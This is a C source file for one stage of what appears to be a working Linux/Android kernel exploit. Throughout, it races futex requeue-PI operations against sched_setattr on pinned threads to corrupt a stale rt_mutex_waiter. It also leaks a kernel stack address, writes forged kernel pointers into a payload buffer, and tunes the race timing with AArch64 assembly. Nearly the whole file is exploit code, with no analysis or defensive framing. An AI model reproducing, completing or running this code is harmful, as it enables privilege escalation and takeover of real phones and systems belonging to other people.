#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "offset.h"
#include "kernelsnitch/utils.h"

#ifndef WAITER_WAIT_SEC
#define WAITER_WAIT_SEC     5
#endif
#ifndef CONSUMER_DELAY_USEC
#define CONSUMER_DELAY_USEC 15000
#endif
#ifndef CONSUMER_NICE
#define CONSUMER_NICE       19
#endif
#ifndef CONSUMER_CALLS
#define CONSUMER_CALLS      1
#endif
#ifndef CONSUMER_CALL_GAP_USEC
#define CONSUMER_CALL_GAP_USEC 60000
#endif
#ifndef OWNER_NICE
#define OWNER_NICE          0
#endif
#ifndef CONSUMER_INLINE
#define CONSUMER_INLINE     0
#endif
#ifndef CONSUMER_DELAY_SPINS
#define CONSUMER_DELAY_SPINS 0
#endif
#ifndef CONSUMER_DELAY_TICKS
#define CONSUMER_DELAY_TICKS 0
#endif
#ifndef STAMP_FINAL_SCHED_IDLE
#define STAMP_FINAL_SCHED_IDLE 0
#endif

#define EXP_BUFFER_BYTES 128
#define EXP_BUFFER_WORDS (EXP_BUFFER_BYTES / sizeof(uint64_t))
#define EXP_READY_OFFSET (EXP_BUFFER_BYTES + 1)
#define EXP_READY_MARKER 0x5a

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static atomic_int g_waiter_tid;
static atomic_int g_waiter_ready;
static atomic_int g_waiter_waiting;
static atomic_int g_owner_started;
atomic_int g_consumer_go;
atomic_int g_consumer_done;
atomic_int g_consumer_phase_done;
atomic_ullong g_consumer_delay_ticks;
extern atomic_int g_stamp_completed;
extern atomic_ullong g_stamp_start_ticks;
extern atomic_ullong g_consumer_seen_ticks;
extern atomic_ullong g_consumer_svc_ticks;
static uint64_t g_payload_buffer[EXP_BUFFER_WORDS];

#ifdef STAMP_STACK_FRAME_OFF
static atomic_int g_leak_done;
static atomic_int g_teardown;
static atomic_int g_w2_done;
static uint64_t g_stack_x;
uint64_t perf_stack_base_stable(int tid);
#endif

struct local_sched_attr {
    uint32_t size;
    uint32_t sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime;
    uint64_t sched_deadline;
    uint64_t sched_period;
};

static long sched_setattr_tid(int tid, int nice_val) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size         = sizeof(attr);
    attr.sched_policy = SCHED_BATCH;
    attr.sched_nice   = nice_val;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
}

static long consumer_sched_setattr_inline(int tid, int policy, int nice_val) {
    struct local_sched_attr attr;
    memset(&attr, 0, sizeof(attr));
    attr.size         = sizeof(attr);
    attr.sched_policy = policy;
    attr.sched_nice   = nice_val;
#if defined(__aarch64__)
#ifdef STAMP_TWO_PHASE
    long delay_ticks = CONSUMER_DELAY_TICKS;
    long delay_spins = CONSUMER_DELAY_SPINS;
#else
    long delay_ticks = g_payload_buffer[10]
                           ? (long)g_payload_buffer[10]
                           : (long)CONSUMER_DELAY_TICKS;
    long delay_spins = g_payload_buffer[11]
                           ? (long)g_payload_buffer[11]
                           : (long)CONSUMER_DELAY_SPINS;
#endif
    register long r0 __asm__("x0") = tid;
    register long r1 __asm__("x1") = (long)&attr;
    register long r2 __asm__("x2") = 0;
    register long r8 __asm__("x8") = __NR_sched_setattr;
    __asm__ volatile(
        "1: ldar w10, [%[go]]\n"
        "cbz w10, 1b\n"
        "mrs x12, cntvct_el0\n"
        "str x12, [%[seen_out]]\n"
        "mov x11, %[delay_ticks]\n"
        "cbz x11, 3f\n"
        "2: mrs x13, cntvct_el0\n"
        "sub x13, x13, x12\n"
        "cmp x13, x11\n"
        "b.lo 2b\n"
        "3:\n"
        "mov x11, %[delay_spins]\n"
        "cbz x11, 5f\n"
        "4: subs x11, x11, #1\n"
        "b.ne 4b\n"
        "5:\n"
        "mrs x13, cntvct_el0\n"
        "str x13, [%[svc_out]]\n"
        "sub x13, x13, x12\n"
        "str x13, [%[delay_out]]\n"
        "svc #0\n"
        : "+r"(r0)
        : "r"(r1), "r"(r2), "r"(r8), [go] "r"(&g_consumer_go)
          , [delay_ticks] "r"(delay_ticks),
          [delay_spins] "r"(delay_spins),
          [delay_out] "r"(&g_consumer_delay_ticks),
          [seen_out] "r"(&g_consumer_seen_ticks),
          [svc_out] "r"(&g_consumer_svc_ticks)
        : "x10", "x11", "x12", "x13", "memory", "cc");
    return r0;
#else
    while (!atomic_load(&g_consumer_go))
        ;
    return syscall(__NR_sched_setattr, tid, &attr, 0);
#endif
}

void do_stamp_stack(uint64_t *buf);
void prepare_stamp_hold(uint64_t *buf);
void log_stamp_config(void);
void log_stamp_status(void);

static void *waiter_thread(void *arg __attribute__((unused))) {
    pin_to_core(2);
    int tid = (int)syscall(__NR_gettid);
    atomic_store(&g_waiter_tid, tid);

#ifdef STAMP_STACK_FRAME_OFF
    while (!atomic_load(&g_leak_done))
        syscall(__NR_getpid);
#endif

    if (syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("Waiter: lock_pi chain failed errno=%d\n", errno);
        return NULL;
    }

    atomic_store(&g_waiter_ready, 1);

    while (!atomic_load(&g_owner_started))
        usleep(1000);

    struct timespec timeout;
    syscall(__NR_clock_gettime, CLOCK_MONOTONIC, &timeout);
    timeout.tv_sec += WAITER_WAIT_SEC;

    atomic_store(&g_waiter_waiting, 1);

    pr_info("Waiter: futex wait requeue pi\n");
    errno = 0;
    long wrq_rc = syscall(__NR_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                          &timeout, &f_pi_target, 0);
    pr_info("Waiter: wait requeue pi returned rc=%ld errno=%d\n",
            (long)wrq_rc, errno);

#ifdef STAMP_STACK_FRAME_OFF
    do_stamp_stack(g_payload_buffer);
    f_pi_chain = (uint32_t)tid;
    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
#else
    syscall(__NR_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

    do_stamp_stack(g_payload_buffer);
#endif

    while (1)
        sleep(1);

    return NULL;
}

static void *owner_thread(void *arg __attribute__((unused))) {
    int owner_tid __attribute__((unused)) = (int)syscall(__NR_gettid);
    /* Keep the PI-chain owner from donating priority 120 to the waiter.
     * On targets whose stack stamp cannot reach rt_mutex_waiter::prio, this
     * lets the consumer's legal priority reduction change the waiter's
     * effective priority and enter rt_mutex_adjust_pi().
     */
    if (OWNER_NICE > 0) {
        long ret = sched_setattr_tid(0, OWNER_NICE);
        if (ret != 0)
            pr_warning("Owner: sched_setattr nice=%d failed errno=%d\n",
                       OWNER_NICE, errno);
    }

    if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                NULL, NULL, 0) != 0) {
        pr_warning("Owner: lock_pi target failed errno=%d\n", errno);
        return NULL;
    }

    while (!atomic_load(&g_waiter_ready))
        usleep(1000);

    atomic_store(&g_owner_started, 1);

    pr_debug("Owner: lock_pi chain, will block\n");
    syscall(__NR_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_debug("Owner: lock_pi chain acquired\n");

#ifdef STAMP_STACK_FRAME_OFF
    f_pi_target = (uint32_t)owner_tid;
    errno = 0;
    long urc = syscall(__NR_futex, &f_pi_target, FUTEX_UNLOCK_PI, 0,
                       NULL, NULL, 0);
    pr_info("Owner: unlock_pi target rc=%ld errno=%d\n", urc, errno);
    atomic_store(&g_teardown, 1);
#endif

    while (1)
        sleep(1);
    return NULL;
}

#ifdef STAMP_STACK_FRAME_OFF
static void *waiter2_thread(void *arg __attribute__((unused))) {
    pin_to_core(1);
    pr_debug("Waiter2: lock_pi target\n");
    syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&g_w2_done, 1);
    pr_debug("Waiter2: lock_pi target returned errno=%d\n", errno);
    while (1)
        sleep(1);
    return NULL;
}
#endif

static void *consumer_thread(void *arg __attribute__((unused))) {
    pin_to_core(3);
    int tid = 0;
    while (!(tid = atomic_load(&g_waiter_tid)))
        usleep(1000);
    long ret = 0;
#ifdef STAMP_TWO_PHASE
    ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
                                        CONSUMER_NICE - 1);
    atomic_store(&g_consumer_phase_done, 1);
    while (atomic_load(&g_consumer_go) != 0)
        ;
    ret = consumer_sched_setattr_inline(
        tid, STAMP_FINAL_SCHED_IDLE ? SCHED_IDLE : SCHED_BATCH,
        CONSUMER_NICE);
#else
    if (CONSUMER_INLINE) {
        ret = consumer_sched_setattr_inline(tid, SCHED_BATCH,
                                            CONSUMER_NICE);
    } else {
#ifdef STAMP_STACK_FRAME_OFF
        while (!atomic_load(&g_consumer_go))
            usleep(200);
#else
        while (!atomic_load(&g_consumer_go))
            ;
#endif

#ifdef STAMP_CONSUMER_PRE_USEC
        if (STAMP_CONSUMER_PRE_USEC > 0)
            usleep(STAMP_CONSUMER_PRE_USEC);
#endif

        if (CONSUMER_DELAY_USEC > 0) {
            for (volatile int i = 0; i < CONSUMER_DELAY_USEC; i++)
                __asm__ volatile("" ::: "memory");
        }

        for (int i = 0; i < CONSUMER_CALLS; i++) {
            ret = sched_setattr_tid(
                tid, (i & 1) ? CONSUMER_NICE - 1 : CONSUMER_NICE);
            usleep(CONSUMER_CALL_GAP_USEC);
        }
    }
#endif
#if STAMP_SYNC_FINAL && !STAMP_INLINE_RETURN
#ifdef STAMP_TWO_PHASE
    while (atomic_load(&g_stamp_completed) < 2 * (STAMP_BURST + 1))
        ;
#else
    while (atomic_load(&g_stamp_completed) < STAMP_BURST + 1)
        ;
#endif
#endif
    log_stamp_status();
    pr_info("Consumer: sched_setattr returned %ld errno=%d\n", ret, errno);

    atomic_store(&g_consumer_done, 1);

    while (1)
        sleep(1);
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    if (argc < 2) {
        pr_warning("Usage: %s <buffer_fd>\n", argv[0]);
        return 1;
    }

    int buf_fd = atoi(argv[1]);
    ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
    if (n != EXP_BUFFER_BYTES) {
        pr_warning("Buffer fd %d unreadable: pread=%zd errno=%d\n",
                   buf_fd, n, errno);
        return 1;
    }

    pr_info("Stage started pid=%d\n", getpid());
    log_stamp_config();
#ifdef STAMP_TWO_PHASE
    unsigned long long stage_delay_ticks =
        (unsigned long long)CONSUMER_DELAY_TICKS;
    unsigned long long stage_delay_spins =
        (unsigned long long)CONSUMER_DELAY_SPINS;
#else
    unsigned long long stage_delay_ticks = g_payload_buffer[10]
                                               ? g_payload_buffer[10]
                                               : CONSUMER_DELAY_TICKS;
    unsigned long long stage_delay_spins = g_payload_buffer[11]
                                               ? g_payload_buffer[11]
                                               : CONSUMER_DELAY_SPINS;
#endif
    pr_info("Stage consumer: delay_us=%d ticks=%llu spins=%llu calls=%d "
            "owner_nice=%d inline=%d\n",
            CONSUMER_DELAY_USEC, stage_delay_ticks,
            stage_delay_spins, CONSUMER_CALLS, OWNER_NICE, CONSUMER_INLINE);
    pr_info("Stage payload: tree_pc=%#llx tree_left=%#llx task=%#llx "
            "lock=%#llx\n",
            (unsigned long long)g_payload_buffer[0],
            (unsigned long long)g_payload_buffer[2],
            (unsigned long long)g_payload_buffer[6],
            (unsigned long long)g_payload_buffer[7]);

    /* Any expensive network-state preparation must happen before the PI
     * waiter is created.  Running it on the waiter after timeout leaves a
     * long interval where normal scheduler activity can traverse an
     * unstamped stale rt_mutex_waiter. */
    prepare_stamp_hold(g_payload_buffer);

    pthread_t waiter, owner, consumer;

    pthread_create(&waiter,   NULL, waiter_thread,   NULL);
    pthread_create(&owner,    NULL, owner_thread,    NULL);
    pthread_create(&consumer, NULL, consumer_thread, NULL);

#ifdef STAMP_STACK_FRAME_OFF
    {
        int wtid = 0;
        while (!(wtid = atomic_load(&g_waiter_tid)))
            usleep(1000);

        uint64_t base = perf_stack_base_stable(wtid);
        if (!base) {
            pr_error("Main: kernel stack leak failed for waiter tid=%d\n",
                     wtid);
            return 1;
        }
        uint64_t frame_off = (uint64_t)STAMP_STACK_FRAME_OFF;
        {
            char fo[32] = {0};
            int ffd = open("/data/local/tmp/gl.frameoff", O_RDONLY | O_CLOEXEC);
            if (ffd >= 0) {
                ssize_t fn = read(ffd, fo, sizeof(fo) - 1);
                close(ffd);
                if (fn > 0) {
                    unsigned long v = strtoul(fo, NULL, 0);
                    if (v) {
                        frame_off = (uint64_t)v;
                        pr_info("Main: frame offset overridden to %#lx\n", v);
                    }
                }
            }
        }
        g_stack_x = base + frame_off;

        g_payload_buffer[5] = g_stack_x;
        g_payload_buffer[6] = 0;
        g_payload_buffer[7] = g_stack_x + 24;

        pr_success("Main: stack base=%#llx X=%#llx (frame +%#x)\n",
                   (unsigned long long)base,
                   (unsigned long long)g_stack_x,
                   (unsigned)frame_off);
        pr_debug("Main: payload pi_left=%#llx task=%#llx lock=%#llx\n",
                (unsigned long long)g_payload_buffer[5],
                (unsigned long long)g_payload_buffer[6],
                (unsigned long long)g_payload_buffer[7]);
        atomic_store(&g_leak_done, 1);
    }
#endif

    while (!atomic_load(&g_waiter_waiting) ||
           !atomic_load(&g_owner_started))
        usleep(1000);

    unsigned char ready = EXP_READY_MARKER;
    if (pwrite(buf_fd, &ready, sizeof(ready), EXP_READY_OFFSET) !=
        (ssize_t)sizeof(ready)) {
        pr_warning("Main: ready signal failed errno=%d\n", errno);
        return 1;
    }
    pr_info("Main: waiter/owner ready; pre-race window opened\n");

#ifdef STAMP_STACK_FRAME_OFF
    {
        pthread_t waiter2;
        if (pthread_create(&waiter2, NULL, waiter2_thread, NULL) != 0)
            pr_warning("Main: waiter2 create failed errno=%d\n", errno);
        else
            usleep(300000);
    }
#endif

    usleep(200000);

    pr_info("Main: futex cmp requeue pi\n");
    errno = 0;
    long rq_rc = syscall(__NR_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                         (void *)1, &f_pi_target, 0);
    pr_info("Main: cmp requeue pi rc=%ld errno=%d\n", rq_rc, errno);

    while (!atomic_load(&g_consumer_done))
        sleep(1);

#ifdef STAMP_STACK_FRAME_OFF
    for (int i = 0; i < 4000; i++) {
        if (atomic_load(&g_teardown) && atomic_load(&g_w2_done))
            break;
        usleep(1000);
    }
    pr_debug("Main: teardown=%d w2_done=%d\n",
             atomic_load(&g_teardown), atomic_load(&g_w2_done));
    usleep(50000);
#endif

    pr_info("Main: chain complete\n");
    unsigned char done = 0xa5;
    if (pwrite(buf_fd, &done, sizeof(done), EXP_BUFFER_BYTES) !=
        (ssize_t)sizeof(done)) {
        pr_warning("Main: completion signal failed errno=%d\n", errno);
        return 1;
    }

#ifdef STAMP_STACK_FRAME_OFF
    pr_info("Main: completion signaled\n");
    _exit(0);
#else
    pr_info("Main: completion signaled; parking process\n");
    for (;;)
        pause();
#endif
}
